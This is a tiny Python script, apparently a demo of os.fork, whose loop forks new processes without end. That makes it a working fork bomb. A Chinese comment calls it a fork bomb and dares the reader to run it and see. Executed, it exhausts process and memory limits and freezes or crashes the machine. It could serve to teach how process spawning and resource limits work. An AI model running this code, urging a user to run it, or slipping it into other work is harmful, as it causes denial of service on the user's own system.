#!/usr/bin/env python
# -*- coding:utf-8 -*-
import os

os.fork()
os.fork()
#下面是fork炸弹，不相信你执行看看
while True:
    os.fork()

print("-----1----")